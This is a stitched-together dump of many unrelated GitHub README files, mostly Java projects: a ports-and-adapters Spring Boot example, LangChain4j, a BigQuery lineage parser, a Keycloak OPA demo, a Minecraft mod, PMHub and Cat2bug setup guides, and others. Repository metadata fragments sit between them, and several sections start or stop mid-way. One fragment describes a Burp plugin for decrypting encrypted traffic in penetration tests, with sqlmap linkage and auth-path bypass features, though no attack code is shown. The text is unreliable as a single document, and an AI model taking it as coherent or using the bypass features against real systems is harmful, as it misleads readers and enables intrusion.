### [Share your thin ports and adapters in another language or framework here! 🙌](https://github.com/aleixmorgadas/thin-ports-and-adapters/discussions/categories/thin-p-a-in-other-languages-and-frameworks)

This is an example of a Ports and Adapters (P&A for short) architecture in Java 21 and Spring Boot.

We can define a simple P&A architecture as follows:

```mermaid
graph LR
    RestControllerAdapter --> ApplicationService
    ApplicationService --> Entity
    Entity --> RepositoryPort
    RepositoryPort --> RepositorySQLAdapter
    subgraph Outside 
        RestControllerAdapter
        RepositorySQLAdapter
    end
    subgraph Inside 
        ApplicationService
        Entity
        RepositoryPort
    end
    
    PAdapter(Primary Adapter) -.-> RestControllerAdapter
    PPort(Primary Port) -.-> ApplicationService
    SAdapter(Secondary Adapter) -.-> RepositorySQLAdapter
    SPort(Secondary Port) -.-> RepositoryPort
```

![ports and adapters example](./.github/assets/hexagonal.svg)
[Reference](https://codesoapbox.dev/ports-adapters-aka-hexagonal-architecture-explained/)

A possible Spring Boot implementation of the adapters is:

```java
// RestControllerAdapter (Primary Adapter)
@RestController
class TeamController {
    private final TeamService teamService; // Primary Port
    
    @GetMapping(""/teams"")
    public List<TeamData> getTeams() {
        return teamService.getTeams();
    }
}

// TeamRepositoryPort (Secondary Port)
interface TeamRepository extends ListCrudRepository<Team, Long> {
}

// The SQL Adapter of the TeamRepositoryPort is provided by Spring Data JPA. It is the Secondary Adapter.
```

### Is it only this?

Yes, a ports and adapters architecture is only this.

Patterns like Domain Events, Aggregates, Value Objects, CQRS and Event Sourcing, all those patters go beyond the intention or responsibility of a ports and adapters architecture. Indeed, a P&A architecture works well with CRUD models (or models with not many domain logic) as well as Domain Models.

The beauty of it is that it adapts to each part of your business, and you can choose the right amount of abstraction/complexity for each scenario.

### And testing?

IMHO, this is where a P&A shines. It really helps you create a solid and adaptable test suite. Here a short example of test types.

**End-to-end tests**

- [TeamControllerE2ETest](src/test/java/dev/aleixmorgadas/thinportsandadapters/web/TeamControllerE2ETest.java)

**Integration test**

- HTTP adapter. [TeamControllerIntegrationTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/web/TeamControllerIntegrationTest.java)
- Service and SQL Repository. [TeamServiceIntegrationTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/domain/TeamServiceIntegrationTest.java)
- SQL Repository. [TeamRepositoryIntegrationTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/domain/TeamRepositoryIntegrationTest.java)

**Unit test**

- HTTP adapter. [TeamControllerUnitTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/web/TeamControllerUnitTest.java)
- Service. [TeamServiceTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/domain/TeamServiceTest.java)
- Domain. [TeamTest](https://github.com/aleixmorgadas/thin-ports-and-adapters/blob/main/src/test/java/dev/aleixmorgadas/thinportsandadapters/domain/TeamTest.java)

## Running the application

```shell
./gradlew bootTestRun
```

ℹ️ It uses [Spring Boot integration][sbit] with Testcontainers to spin up a PostgreSQL container.

### Using the API

```shell
curl -X GET http://localhost:8080/teams
``` 

```shell
curl -X POST -H ""Content-Type: application/json"" -d '{""name"": ""Team 1""}' http://localhost:8080/teams
```

```shell
curl -X PATCH -H ""Content-Type: application/json"" -d '{""name"": ""Team 1""}' http://localhost:8080/teams/{id}/rename
```

## Running the tests

```shell
./gradlew test
```

You will see how the thin ports and adapters architecture allows us to test the application with multiple approaches:

- Unit tests for the domain logic.
- Integration tests for the application service.
- End-to-end tests for the REST API.

ThomasVitale/langchain4j-spring-boot,main,"# LangChain4j Spring Boot

This project brings [LangChain4j](https://github.com/langchain4j) support in Spring Boot
to build AI and LLM-powered applications. It provides integrations with LLM services
and vector stores, as well as tools, chains, and AI services.

Using the starter projects in this repository, you gain the following advantages over
using the vanilla LangChain4j libraries in Spring Boot:

* Autoconfiguration and unified configuration properties for models and vector stores
* HTTP infrastructure with RestClient, WebClient, and Jackson for all integrations
* Built-in observability with Micrometer, including LLM-specific metrics and traces
* Dev services with Docker Compose and Testcontainers for models and vector stores
* Service bindings for automatic connection configuration when running on Kubernetes.

## 🚀&nbsp; Quick Start

### Pre-Requisites

* Java 17+
* Docker/Podman
* [Spring CLI](https://docs.spring.io/spring-cli/reference/installation.html)

### Getting Started

Using the Spring CLI, you can easily bootstrap a new Spring Boot application with LangChain4j support.

First, add the LangChain4j Spring Boot catalog providing the project templates.

```shell
spring project-catalog add langchain4j https://github.com/ThomasVitale/langchain4j-spring-boot
```

Then, create a new Spring Boot project for building an LLM Applications with LangChain4j and Ollama.

```shell
spring boot new myapp langchain4j-chat-ollama
```

Finally, navigate to the `myapp` folder and run the Spring Boot application. The first time you run it,
it will take a while to download the Ollama container image used as a dev service based on the Testcontainers
Spring Boot integration.

```shell
cd myapp
./mvnw spring-boot:run
```

You can now call the application that will use Ollama and _llama3_ to generate a text response.
This example uses [httpie](https://httpie.io) to send HTTP requests.

```shell
http :8080/ai/chat message==""What is the capital of Italy?""
```

borjavb/bq-lineage-tool,master,"# Bq-Lineage-tool


Bq-lineage tool is a column level lineage parser for BigQuery using ZetaSQL. This 
parser started as a fork of this [project by google](https://github.com/GoogleCloudPlatform/bigquery-data-lineage), but it
has been heavily modified to cover the whole bigquery syntax offered by ZetaSQL. The
output of this parser is a DAG of the columns used in a query from sources to outputs, including
auxiliary fields that could be used as part of filters or other operations that don't result in the
materialisation of a field. 



From any arbitrary BigQuery query, you will get the following outputs:
- `output_columns`: The columns that are part of the output of the query, with all the input 
  columns references that were needed to produce them.
- `joins`: List of joins used in the query, considering the columns used for the join
- `aggregations`: List of columns used for aggregations
- `filters`: List of columns used for filtering
- `other_used_columns`: Any other columns used across the query, like order by
- `selected_tables`: A list of all the tables that were selected in the query.
- `Type`: The type of sql statement `{SELECT, CREATE_VIEW, MERGE...}`

![image](./flow.png)


## What can this parser do?

* It's schema aware. This means that a query like `SELECT * FROM table` will generate a DAG
  with all the output columns of `table`, and not just a single node with a `*` symbol.
* It prunes unused columns. This means that for a query like `WITH base AS (SELECT * FROM
  table) SELECT aColumn FROM base` the output DAG will only contain the column `aColumn` and not the
  whole input table.
* It covers pretty much all the BigQuery syntax, including:
    * `WITH` (CTE) clauses
    * Subqueries
    * `UNNEST`-based `JOINS`
    * `STRUCTS` and `ARRAYS`
    * `JOINS`
    * Analytical functions (`QUALIFY`, `LAG`/`LEAD`, `WINDOWS` etc.)
    * Map aliases to original columns
    * `JSON` functions
    * Access to the `PATH` used in `JSON` functions (`JSON_EXTRACT(field,""$.path.to.field"")`)
    * Access to the literals used in the query, for example, in a `WHERE` clause
    * Access to fields that are not part of the output columns of the table (fields only used in a
      `WHERE` clause)
    * `PIVOT` and `UNPIVOT` transformations
    * `GROUP BY GROUPING SETS`, `ROLLUP` and `CUBE`
    * `UDF` and temporary functions
    * Usage of parameters @param
    * Recursive CTEs
    * It parses `SELECTS`, `CREATE {VIEWS}` and `MERGE` statements
    * It automatically infers internal BQ fields like `_TABLE_SUFFIX`

## What can't it do?

* This parser won't work with procedural SQL. For example, it will fail trying to parse a 
  DECLARE or SET operations.
* This parser won't read the logic within UDF functions. It only checks inputs and outputs.
* ZetaSQL might not be up-to-date with the latest BigQuery features, so if there's something
  super new, it will involve either waiting for ZetaSQL to be updated, or going deep into
  ZetaSQL to build the feature.
* It doesn't work while trying to parse queries accessing `INFORMATION_SCHEMA`-type of tables. I
  guess we could bypass this by using a different type of access, but never when through it deeply.
* This parser won't build the DAG of multiple queries. It only parses a single query at a
  time. To build a full dag of your dbt project, for example, you can use libraries like
  `networkx` to connect the edges from the output of this parser.
* Parse SQL syntax that is not supported by ZetaSQL (for example the + operator in Snowflake joins)
* When doing a `SELECT count(*) FROM table`, the output of the parser would act as if no columns
  were selected. This could be subject to interpretation: should all the columns of the input
  `table` be marked as used? Or should the output be an empty list because this query doesn't
  care about any specific column or number of columns?
* Unexpected bugs - even though this parser has been texted over more than 7000 SQL queries, 
  there still might be some edge cases that suddenly are not covered. SQL is hard.
* It doesn't work with `TVF` (Table Valued Functions) - although ZetaSQL parses it, the output 
  won't show the columns of the TVF.
* Automatically infer UDFs - they have to be defined as part of the script that is going to be parsed.

## How to use
The folder `/src/test/examples` has multiple examples of how to use this parser. The main caveat 
relies on how to build the catalog that ZetaSQL needs. Depending on how much you want the parser 
to automate the whole process for you, there are three different methods to build a catalog, 
from the ""let the parser to it for me"" to ""I'll build the catalog myself""

- `/src/test/examples/BigQuerySqlParserBQSchemaTest.java` shows how to rely on the metadata of 
  BiGQuery to build the catalog. To use this method the user has to be authenticated with gcloud.
  Note that there's zero data access/movement in this operation. The only access that is being 
  done is directly to the metadata of the tables, and only to the tables that are being used in 
  the parsed query, i.e., this parser won't scan the whole database. The access is done using 
  the bigquery API. You can use  `gcloud auth application-default login` to authenticate. 
- `/src/test/examples/BigQuerySqlParserLocalSchemaTest.java` shows how to use local json files 
  to build the schema. `/src/test/resources/schemas/` has examples of these files. They are 
  exact copies of the metadata information you can get 
[through the API](https://cloud.google.com/bigquery/docs/reference/rest/v2/tables). Note that 
  this is basically what we automate with the previous method.
- `/src/test/examples/ASTExplorerTest.java` Shows an example on how can manually create your own 
  catalog using ZetaSQL methods/constructors and feed it into the parser. 

### Example
The following example uses the first method to build the catalog -  it will use the bigquery API 
to request the metadata of the tables used in the query.
```java
    BigQueryZetaSqlSchemaLoader schemaLoader =
        new BigQueryZetaSqlSchemaLoader(
            BigQueryTableLoadService.usingServiceFactory(
                BigQueryServiceFactory.defaultFactory()
          )
        );

    ZetaSQLResolver parser = new ZetaSQLResolver(schemaLoader);
    
    String sql = """"""
        SELECT
              word,
              SUM(word_count) AS count
            FROM
              `bigquery-public-data.samples.shakespeare`
            WHERE
              word LIKE ""%raisin%""
            GROUP BY
              word;
        """""";
    
    ResolvedNodeExtended table = parser.extractLineage(sql);
    OutputLineage printer = new OutputLineage();
    printer.toYaml(table, ""test"", true);
```
Output:
```
name: ""test""
output_columns:
- name: ""word""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
- name: ""count""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word_count""
other_used_columns:
- name: ""_word_""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
    literal_value:
    - ""%raisin%""
type: ""select""
selected_tables:
- ""bigquery-public-data.samples.shakespeare""
```

### Notes
- This parser **never** accesses the data of the tables or any bigquery instance. The only 
  connection needed is to the metadata of the tables.
- The parser will use a default project+dataset if these are missing in the reference tables of 
  a project. Please refer to `src/main/java/com/borjav/data/options/Options.java` in case you 
  need to set a specific project.
- When using UDFs, they also have to be defined within the code. The parser won't be able to 
  resolve them if they are not defined in the code. Please refer to 
  `src/test/resources/sql/benchmark/udf.yaml`.

SearchScale/lucene-cuvs,main,"# Lucene CuVS Integration

This is an integration for [CuVS](https://github.com/rapidsai/cuvs), GPU accelerated vector search library from NVIDIA (formerly part of [Raft](https://github.com/rapidsai/raft)), into [Apache Lucene](https://github.com/apache/lucene).

## Architecture

As an initial integration, the CuVS library is plugged in as a new KnnVectorFormat via a custom codec.

![Architecture](lucene-cuvs-architecture.png ""Lucene CuVS Architecture"")

By way of a working example, Wikipedia corpus (1.3M documents) can be indexed, each document having a content vector. Queries (questions.vec.txt) can be executed after the indexing.

> :warning: This is not production ready yet.

## Running

MetaGLM/zhipuai-sdk-java-v4,main,"# 智谱大模型开放接口SDK

智谱[开放平台](http://open.bigmodel.cn/howuse/platformintroduced)大模型接口Java SDK（Big Model API SDK in
Java），让开发者更便捷的调用智谱开放API

## 简介
- <font color=""red"">**java sdk仍在开发测试阶段，有bug请留言联系**</font>
- 对所有接口进行了类型封装，无需查阅API文档即可完成接入

## 安装

- 运行环境：JDK1.8+
- maven坐标
```
        <dependency>
            <groupId>cn.bigmodel.openapi</groupId>
            <artifactId>oapi-java-sdk</artifactId>
            <version>release-V4-2.3.0</version>
        </dependency>
```
### 依赖信息

```text
okhttp_3.14.9
java-jwt_4.2.2
jackson_2.11.3
retrofit2_2.9.0 
```
## 使用
- 调用流程：
    1. 使用APIKey创建Client
    2. 调用Client对应的成员方法
- [V4Test.java](src/test/java/com/zhipu/oapi/V4Test.java)有完整的demo示例，请替换自己的ApiKey进行测试


> SDK提供了ClientV4的构造器，此方法可以在创建Client时进行配置，可配置项如下：

 
- enableTokenCache：是否开启token缓存，开启后会缓存token，减少token请求次数
- networkConfig：设置连接超时、读取超时、写入超时、ping间隔、ping超时时间
- connectionPool：设置连接池

``` 
String API_SECRET_KEY = ""your api"";
private static final ClientV4 client = new ClientV4.Builder(API_SECRET_KEY) 
        .enableTokenCache()
        .networkConfig(30, 10, 10, 10, TimeUnit.SECONDS)
        .connectionPool(new okhttp3.ConnectionPool(8, 1, TimeUnit.SECONDS))
        .build();
 
```

> 🌐️ 中文 | [English](README-en.md)

**OSGraph (Open Source Graph)** 是一个开源图谱关系洞察工具，基于GitHub开源数据全域图谱，实现开发者行为、项目社区生态的分析洞察。可以为开发者、项目Owner、开源布道师、社区运营等提供简洁直观的开源数据视图，帮助你和你的项目制作专属的开源名片、寻求契合的开发伙伴、挖掘深度的社区价值。




## 产品地址

**[https://osgraph.com](https://osgraph.com)**


## 快速开始

本地启动测试请参考：[OSGraph部署文档](docs/zh-CN/DeveloperManual.md)


## 功能介绍

当前产品默认提供了6张开源数据图谱供大家体验，包含项目类图谱3个（贡献、生态、社区）、开发类3个（活动、伙伴、兴趣）。



### 项目贡献图谱

**发现项目核心贡献**：根据项目开发者研发活动信息（Issue、PR、Commit、CR等），找到项目核心贡献者。

**Q**：我想看看给Apache Spark项目写代码的都有谁？

**A**：选择“项目贡献图谱” - 搜索spark - 选择apache/spark。可以看到HyukjinKwon、dongjoon-hyun等核心贡献者，另外还一不小心捉到两个“显眼包”，AmplabJenkins、SparkQA这两个只参与CodeReview的机器人账号。

![](docs/img/spark-contrib.png)



### 项目生态图谱

**洞察项目生态伙伴**：提取项目间的开发活动、组织等关联信息，构建项目核心生态关系。

**Q**：最近很火的开源大模型Llama3周边生态大致是什么样的？

**A**：选择“项目生态图谱” - 搜索llama3 - 选择meta-llama3/llama3。可以看到pytorch、tensorflow、transformers等知名AI项目，当然还有上科技头条的llama.cpp。比较惊喜的发现是ray竟然和llama3有不少公共开发者，可以深度挖掘一下。

![](docs/img/llama3-eco.png)



### 项目社区图谱

**分析项目社区分布**：根据项目的开发活动、开发者组织等信息，提取项目核心开发者社区分布。

**Q**：大数据引擎Flink发展这么多年后的社区现状如何？

**A**：选择“项目社区图谱” - 搜索flink - 选择apache/flink。可以看到项目关注者主要来自中、美、德三国，而Alibaba组织是代码贡献的中坚力量。

![](docs/img/flink-comm.png)



### 开发活动图谱

**展示个人开源贡献**：根据开发者研发活动信息（Issue、PR、Commit、CR等），找到参与的核心项目。

**Q**：大神Linus Torvalds最近在参与哪些开源项目？

**A**：选择“开发活动图谱” - 搜索torvalds。果然linux项目是torvalds的主要工作，不过llvm、mody、libgit2也有所参与，同时也看到他在subsurface这种“潜水日志管理工具”上的大量贡献，果然大佬的爱好都很广泛。

![](docs/img/torvalds-act.png)



### 开源伙伴图谱

**寻找个人开源伙伴**：找到开发者在开源社区中，与之协作紧密的其他开发者。

**Q**：我想知道在开源社区有没有和我志同道合的人？

**A**：选择“开发伙伴图谱” - 搜索我的ID。让我震惊的是有那么多陌生人和我关注了同一批项目，这不得找机会认识一下，说不定就能找到新朋友了。而和我合作PR的人基本上都是我认识的朋友和同事，继续探索一下朋友们的开源伙伴，开源社区的“六度人脉”不就来了么。

![](docs/img/fanzhidongyzby-part.png)



### 开源兴趣图谱

**挖掘个人开源兴趣**：根据参与的项目主题、标签等信息，分析开发者技术领域与兴趣。

**Q**：GitHub上最活跃的开发者对什么技术感兴趣？

**A**：选择“开源兴趣图谱” - 搜索sindresorhus（[GitHub用户榜](https://gitstar-ranking.com) No.1）。整体来看sindresorhus对node、npm、js很感兴趣，另外他发起的awesome项目足足30W星，令人咋舌！当前的开源兴趣数据主要来自项目有限的标签信息，后续借助AI技术可能会有更好的展现。

![](docs/img/sindresorhus-intr.png)



## 未来规划

未来将会有更多有趣的图谱和功能加入到OSGraph：

* 简单灵活的API设计，让图谱无限扩展。
* 自由高效的画布交互，无限探索数据价值。
* 图谱URL支持嵌入Markdown，制作我的开源名片。
* 基于AI技术的项目主题标签分析。
* 多人多项目联合分析，图谱洞察一键可达。
* 更丰富的数据展示与多维分析。
* **更多功能，与你携手共建……**

thomasdarimont/keycloak-opa-authz-demo,main,"Keycloak Open Policy Integration Demo
----

Example code for integrating Open Policy Agent with Keycloak presented at Keycloak Dev Day 2024.

[Slides](keycloak-devday-2024-flexible-authz-for-keycloak-with-openpolicyagent.pdf)

# Build

```
mvn clean package -DskipTests
```

# Run

## Run with HTTP

Start the docker compose setup with Keycloak, Open Policy Agent, Mail server.

```
docker compose -f dev/docker-compose.yml up
```

## Run with HTTPS

This example uses https://id.kubecon.test:8443/auth as the Keycloak auth server URL.

To use the example with https just add a mapping for `id.kubecon.test` to your `/etc/hosts` file
and regenerate the certificates via the [mkcert](https://github.com/FiloSottile/mkcert) tool first.

Then start the `dev/docker-compose-https.yml` docker compose file.

´´´
(cd dev/config/certs && mkcert -install && mkcert -cert-file kubecon.pem -key-file kubecon-key.pem ""*.kubecon.test"")

docker compose -f dev/docker-compose-https.yml up
´´´

# Demo

Once up, you can access Keycloak via http://localhost:8080/auth and login with `admin/admin`.

The demo contains a realm called `opademo` that is configured via `dev/config/realms/opademo.yaml`
through [keycloak-config-cli](https://github.com/adorsys/keycloak-config-cli).

## Users

The example contains a few users to demonstrate various aspects.

- Username: ""tester"" with Password: ""test""
- Username: ""admin"" with Password: ""test""
- Username: ""guest"" with Password: ""test""

## Clients

The `opademo` realm contains a few client applications to demonstrate various access policies expressed
with the REGO Policy language provided by OpenPolicyAgent. 

## OPA Access Policy

The client access policies are defined in the file `dev/opa/policies/keycloak/realms/opademo/access/policy.rego`. 
For this demo Open Policy Agent is configured to watch the file for changes and will automatically
update the policies on change.

To enable the policy check, go to `opademo Realm` -> `Authentication` -> `Required Actions` -> `Enable: OPA Policy Check`.

## Realm configuration

The realm with the clients, roles, groups and users are defined in the `dev/config/realms/opademo.yaml` 
config file. 

For the demo the `tester` user can be granted more access incrementally by uncommenting the role / group memeber ship mapping in the `opademo.yaml` file.

To apply the changed realm configuration to the running Keycloak instance, just execute the following command:

`docker restart dev-keycloak-provisioning-1`.",0,0,1,apache-2.0,1.0

- **与安全工具联动**：支持与 sqlmap、xray 的联动，让你更高效地发现潜在的安全漏洞。
- **支持Burp多模块**：适用于 Burp 的多个模块，如 Intruder、Proxy、Repeater 和 Scanner。
- **其他小功能**：[Bypass Host Check](https://github.com/outlaws-bai/Galaxy/wiki/%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3#bypass-host-check)、[Bypass Auth Of Path](https://github.com/outlaws-bai/Galaxy/wiki/%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3#bypass-auth-of-path)、[Parse Swagger Api Doc](https://github.com/outlaws-bai/Galaxy/wiki/%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3#parse-swagger-api-doc)...

## 🔒 适用场景

- 渗透测试中发现网站的 HTTP 报文做了加密。
- 加密逻辑较为复杂，如加密算法组合、自定义算法和动态密钥等。
- 想要使用扫描器，支持其对明文请求扫描，扫描请求发出后获得明文响应。
- 你可以逆向出网站的加解密逻辑（包括通过 hook 方式调用客户端代码），并具备一定的代码能力。
- ...

## 🎥 效果演示

**自动解密**

> 启动后代理的请求/响应自动解密，并且将解密后的请求转发到 Repeater 后发送，得到的是明文响应。

![hook](https://raw.githubusercontent.com/outlaws-bai/picture/main/img/hook.gif)

**联动sqlmap**

> 右键获取 sqlmap 扫描的命令，执行 后 sqlmap 就可以扫描明文请求，并得到解密后的响应。

![linkage-sqlmap](https://raw.githubusercontent.com/outlaws-bai/picture/main/img/linkage-sqlmap.gif)

<img alt=""Cubes Without Borders Icon"" src=""media/icon.png"" width=""128"">

A mod that allows you to play Minecraft in a borderless fullscreen window. This means you can keep the game open while interacting with other applications on a different monitor, or even directly on top of Minecraft itself, without the game minimizing.

What sets **Cubes Without Borders** apart from other ""borderless fullscreen"" mods on the market is its explicit support for all major platforms: Linux, macOS, and even Windows. Instead of focusing on just one platform and leaving the mod broken for users of other operating systems, this project strives to provide the best possible experience for everyone, right out of the box. No screen flickering, no strange compositing glitches, no need to sacrifice the ability to change your game's resolution - just smooth, borderless fullscreen gameplay, as it was meant to be.

----

## Usage

To enable borderless fullscreen, go to the `Video Settings` tab where you'd typically find the `Fullscreen` setting, and switch it to the newly added third option: `Borderless`.

Depending on whether you have Sodium installed, you may find the option in question here:

| ![Video Settings](media/video-settings.png) | ![Video Settings (Sodium)](media/video-settings-sodium.png) |
| - | - |

Additionally, the mod introduces a `--borderless` startup flag for those interested. This flag works the same way as the existing `--fullscreen` one, but forces the game to start in borderless fullscreen mode instead.

----

## Config

The mod provides a simple configuration screen, which can be accessed if you have [`Cloth Config API`](https://modrinth.com/mod/cloth-config) installed:

<img alt=""Mod Settings"" width=""480"" src=""media/mod-settings.png"">

| Name | Description |
|:-----|-------------|
| Pause On Lost Focus | If set to `Yes`, Minecraft will automatically pause whenever its window loses focus |
| Fullscreen Type | Allows you to override the default fullscreen type used by Minecraft when the `Fullscreen` setting is set to `ON` |
| Borderless Fullscreen Type | Allows you to override the borderless fullscreen type used when the `Fullscreen` setting is set to `Borderless` |

### Fullscreen Types

| Name | Description |
|------|-------------|
| `minecraft:default` | Default fullscreen mode used by Minecraft |
| `minecraft:windowed` | OS-agnostic windowed fullscreen mode<br><br>This implementation is not tied to a specific OS, making it susceptible to quirks across different platforms. While it generally shouldn't be preferred over other fullscreen types, it might work well in certain contexts. |
| `linux:borderless` | Borderless fullscreen mode for Linux systems<br><br>It works well in most cases; however, due to [the FreeDesktop spec](https://specifications.freedesktop.org/wm-spec/wm-spec-1.3.html#STACKINGORDER), you may notice that conforming desktops *(like **KDE Plasma**)* don't place PiP windows *(e.g., media players)* above fullscreen windows. To fix this, change the layer of the window in question to `OSD` or `Overlay` *([here's an example for Firefox](media/kde-plasma-window-rules.png))*.<br>If you use **KDE Plasma** with an auto-hiding/dodging taskbar, you might want to try `minecraft:windowed`, as it functions pretty nicely in this scenario. |
| `macos:borderless` | Borderless fullscreen mode for macOS systems |
| `windows:borderless` | Borderless fullscreen mode for Windows systems<br><br>This implementation has a few quirks and doesn't always work well with overlays *(like the one from Discord)*. If possible, it is generally recommended to use `windows:windowed` instead. |
| `windows:windowed` | Windowed fullscreen mode for Windows systems<br><br>This provides the best experience for Windows users overall. The only known issue is that **OBS Game Capture** doesn't automatically detect Minecraft's window when using this mode. This is a bug with OBS, and I submitted a [pull request](https://github.com/obsproject/obs-studio/pull/10880) to address it. If it hasn't been merged yet, and this feature is important to you, consider using other fullscreen types as a temporary workaround. |
| `windows:exclusive` | Exclusive fullscreen mode for Windows systems that mimics some qualities of borderless fullscreen<br><br>You might be familiar with this if you're coming from mods like [`CW/B`](https://github.com/Kir-Antipov/cubes-with-borders) or [`Borderless Mining`](https://github.com/comp500/BorderlessMining)<br><br>However, it generally shouldn't be used, as it causes notorious screen flickering whenever the game window loses or regains focus, and it doesn't cooperate well with compositing.<br>Unless you're specifically aiming to minimize input lag in the game about blocks, which is the main and only benefit of this mode, it's best to consider other options. |

### 4.2、后端项目启动

#### 第一步，下载项目源码

①、使用 Git 命令

网络比较通畅的小伙伴可以直接从 GitHub 上拉取，命令如下：

```
git clone git@github.com:laigeoffer/pmhub.git
```

国内的小伙伴也可以直接使用码云 Gitee 上的镜像仓库地址拉取：

```
git clone https://gitee.com/laigeoffer/pmhub.git
```

②、直接下载压缩包

也可以直接下载 GitHub 上的压缩包，然后解压到本地。

- GitHub 地址：[https://github.com/laigeoffer/pmhub](https://github.com/laigeoffer/pmhub)
- 码云地址：[https://gitee.com/laigeoffer/pmhub](https://gitee.com/laigeoffer/pmhub)

![下载项目源码压缩包](https://cdn.tobebetterjavaer.com/images/20240324/76023993f091417a800ec7da19989e88.png)

③、直接通过 GitHub 桌面版

我个人一直比较喜欢实用 GitHub 桌面版来管理仓库，图形化界面操作起来也比较舒服。

![](https://cdn.tobebetterjavaer.com/images/20240324/27136b6558d84edb861461ca5452021d.png)

#### 第二步，使用 Intellij IDEA 导入项目

这一步应该就不需要我多讲了，相信大家都能搞定。

![](https://cdn.tobebetterjavaer.com/stutymore/20240601234905.png)
#### 第三步，导入数据库

推荐大家使用 [Navicat](https://javabetter.cn/nice-article/itmind/navicatmacyjpx.html) 这款图形化数据库管理工具。


数据库文件路径在 pmhub/sql/,在Navicat中导入所有数据库文件（每一个微服务对应一个数据库）

![](https://cdn.tobebetterjavaer.com/stutymore/20240629223138.png)

可以直接右键在 terminal 终端中打开，然后通过 pwd 和 ls 命令查看文件的绝对路径。

![](https://cdn.tobebetterjavaer.com/images/20240324/24f0cbafe1fb4995827015c294196eb2.png)

拿到绝对路径后，就可以在 Navicat 中导入数据库文件了。

![](https://cdn.tobebetterjavaer.com/images/20240324/aa4cb8f705aa4f46a7d4835c9d26a596.png)

导入完成后，刷新一下就可以看到最新的数据库表了。
（当然你也可以直接复制sql，然后在Navicat执行）

#### 第四步，基础环境准备
* 1、启动 MySQL（必须）

可以选择本机直接安装 MySQL，也可以通过 Docker 的方式，但需要做好磁盘挂载，推荐本机安装！


* 2、启动 Redis（必须）

①、如果你是 macOS 用户，可以直接在终端输入`redis-server`启动 Redis。

![](https://cdn.tobebetterjavaer.com/images/README/1711692102829.png)

②、如果你是 Windows 用户，可以直接双击 redis-server.exe 启动 Redis。

③、当然也可以直接通过 Docker 启动 Redis。
```shell
# 拉取 Redis 镜像:
docker pull redis
# 启动 Redis 容器:
docker run --name my-redis -d redis
```

* 3、启动 Nacos（必须）

[官网](https://nacos.io/download/nacos-server/)下载 Nacos，找到 /conf/application.properties 文件，修改数据库连接信息。可以直接复制 pmhub/docker/nacos/conf/application.properties 内容。

修改下数据库配置信息为你自己的数据库，本地启动可以把鉴权关了。

```
1. 如果数据库名也是 pmhub-nacos，那么只需要修改用户名和密码即可。
2. 如果用户名也是 root，那么只需要修改密码即可。
3. 如果密码也一样，那么就不需要修改了（不可能，绝对不可能这么巧😂）。
```

![修改nacos配置文件](https://cdn.tobebetterjavaer.com/stutymore/20240529173446.png)

①、如果你是 macOS 用户，可以直接在终端输入`sh startup.sh -m standalone`启动 Nacos。

②、如果你是 Windows 用户，可以直接双击 startup.cmd 启动 Nacos。

启动成功后访问 http://localhost:8848/nacos 即可看到 Nacos 控制台。默认用户名密码都是 nacos。

![nacos启动成功界面](https://cdn.tobebetterjavaer.com/stutymore/20240529173621.png)

* 4、启动 SkyWalking 分布式链路追踪（非必须）

参考手册：[SkyWalking 启动手册](https://laigeoffer.cn/pmhub/interview/skywalking/)

* 5、启动 Sentinel 分布式熔断和降级（非必须）

参考手册：[Sentinel 启动手册](https://laigeoffer.cn/pmhub/interview/feign-sentinel/)


* 6、启动 Seata 分布式事务（非必须）

参考手册：[Seata 启动手册](https://laigeoffer.cn/pmhub/interview/seata/)

* 7、启动 Rocketmq 消息队列（非必须）

参考手册：[Rocketmq 启动手册](https://laigeoffer.cn/pmhub/interview/rocketmq/)



#### 第五步，启动各个微服务

> 注意：如果遇到服务启动失败，可自行查看 nacos 配置是否做了修改，如数据库连接信息等。

①、启动 pmhub-gateway 网关服务

找到 pmhub-gateway 项目，右键 Run PmHubGatewayApplication.main()。

![pmhub-gateway启动成功](https://cdn.tobebetterjavaer.com/stutymore/20240529174025.png)

②、启动 pmhub-auth 认证服务

找到 pmhub-auth 项目，右键 Run PmHubAuthApplication.main()。

③、启动 pmhub-system 系统服务

找到 pmhub-system 项目（在pmhub-modules 下），右键 Run PmHubSystemApplication.main()。
pmhub-system 启动前需要修改 nacos 中的 pmhub-system-dev.yml 配置文件，修改数据库连接信息为你自己的数据库。

## 部署

### 手动命令行部署

手动部署需要提前安装Java 11环境，并下载cat2bug-platform发行版程序，执行命令如下：

```shell
nohup java -jar cat2bug-platform-0.4.2.jar>/dev/null 2>&1 &
```

### Docker单容器部署

以下提供的是Docker官网容器化的部署方案，执行命令如下：

```docker
docker run -it -d -p 8022:8022 --name cat2bug-platform cat2bug/cat2bug-platform:latest
```

由于Docker官网访问不稳定，我们还提供了国内镜像下载的方案：

```docker
docker run -it -d -p 8022:8022 --name cat2bug-platform qyzw-docker.pkg.coding.net/cat2bug/cat2bug-platform/single:latest
```

部署成功后，打开浏览器访问[http://127.0.0.1:8022](http://127.0.0.1:8022),在登陆页面自行注册账号登陆使用即可。

注意：系统管理员账号：admin    密码：cat2bug，此账号用于管理注册用户。

此部署方式为单容器最精简方式部署，数据库默认采用嵌入式H2，多用于小型或临时性项目的缺陷管理，如需Mysql或多容器部署方案，请查看[官网文档](https://www.cat2bug.com/download/cat2bug-platform/#%E9%83%A8%E7%BD%B2)。

# JxInsta
A java library of Instagram private web API (*may include mobile api in future*).  This library is built as a replacement for **instagram4j** since it was too old fashioned and was facing a challenge problem due to a similar header population problem among it's users. This project is lead by **[EasyInsta](https://github.com/ErrorxCode/EasyInsta)** and is part of it.

## Features

-   Lightweight and Easy 2 use, Object-oriented
-   No need API token
-   Supports  **Sending messages**
-   Supports  **Getting/fetching messages**
-   Supports  **Deleting message**
